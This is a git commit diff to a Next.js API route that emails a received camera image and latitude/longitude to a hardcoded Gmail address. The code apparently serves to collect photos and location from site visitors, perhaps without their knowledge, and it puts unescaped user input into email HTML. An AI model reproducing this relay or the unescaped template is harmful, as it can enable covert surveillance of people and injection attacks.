6988261132ce9f7e54b188093e7ea90630d283e6
quantura <admin@quanturatech.com>
2026-01-29 15:31:47 +0530

    fixed cammera issue-11

--- app/api/send/route.ts
+++ app/api/send/route.ts
@@ -3,8 +3,6 @@ import nodemailer from "nodemailer";
 export async function POST(req: Request) {
   const { image, lat, lon } = await req.json();
 
-  const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
-
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
@@ -16,53 +14,12 @@ export async function POST(req: Request) {
   await transporter.sendMail({
     from: process.env.MAIL_USER,
     to: ["nakirikantikiran@gmail.com"],
-    subject: "Captured Image & Location",
-    text: `Location:\nLat: ${lat}\nLon: ${lon}`,
-    attachments: [
-      {
-        filename: "capture.jpg",
-        content: base64Data,
-        encoding: "base64"
-      }
-    ]
+    subject: "Captured Data",
+    html: `
+      <p>Location: ${lat}, ${lon}</p>
+      <img src="${image}" />
+    `
   });
 
   return Response.json({ ok: true });
 }
-
-
-
-
-
-
-
-
-
-
-
-
-// import nodemailer from "nodemailer";
-
-// export async function POST(req: Request) {
-//   const { image, lat, lon } = await req.json();
-
-//   const transporter = nodemailer.createTransport({
-//     service: "gmail",
-//     auth: {
-//       user: process.env.MAIL_USER,
-//       pass: process.env.MAIL_PASS
-//     }
-//   });
-
-//   await transporter.sendMail({
-//     from: process.env.MAIL_USER,
-//     to: ["nakirikantikiran@gmail.com"],  // by adding , we can send that to multiple recepents
-//     subject: "Captured Data",
-//     html: `
-//       <p>Location: ${lat}, ${lon}</p>
-//       <img src="${image}" />
-//     `
-//   });
-
-//   return Response.json({ ok: true });
-// }
